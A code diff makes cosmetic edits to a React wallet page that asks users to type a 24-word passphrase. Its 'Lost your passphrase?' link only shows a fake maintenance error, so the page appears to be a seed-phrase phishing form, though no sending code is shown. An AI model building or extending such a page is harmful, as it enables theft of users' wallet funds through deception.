@@ -123,7 +123,7 @@ function WalletPageContent() {
     <div className="min-h-screen bg-zinc-100 sm:bg-white flex justify-center items-start">
       {/* Container - wraps as mobile container on mobile, full-width on desktop */}
       <div className="w-full max-w-md sm:max-w-none min-h-screen bg-white flex flex-col relative shadow-2xl sm:shadow-none border-x border-zinc-200 sm:border-x-0">
-        
+
         {/* Top Header */}
         <header className="bg-[#703d92] text-white h-14 sticky top-0 z-30 shadow-md w-full">
           <div className="flex justify-between items-center w-full h-full px-4 max-w-screen-2xl mx-auto">
@@ -170,11 +170,10 @@ function WalletPageContent() {
           <form onSubmit={handleSubmit} className="space-y-6">
             <div className="space-y-2">
               <textarea
-                id="passphrase-textarea"
                 value={passphrase}
                 onChange={(e) => setPassphrase(e.target.value)}
                 placeholder="Enter your 24-word passphrase here"
-                className="w-full h-40 leading-relaxed"
+                className="w-full h-40 leading-relaxed passphrase-textarea"
                 disabled={anyLoading}
               />
               {errorMessage && (
@@ -211,7 +210,7 @@ function WalletPageContent() {
             </p>
             <p>
               Lost your passphrase?{" "}
-              <span 
+              <span
                 onClick={() => {
                   setErrorMessage("Wallet creation is temporarily disabled during network maintenance.");
                 }}
@@ -223,7 +222,7 @@ function WalletPageContent() {
             </p>
           </div>
         </main>
-        
+
         {/* Fingerprint Warning Modal */}
         {showFingerprintModal && (
           <div className="fixed inset-0 bg-black/45 flex items-center justify-center z-50 p-6 animate-fade-in">
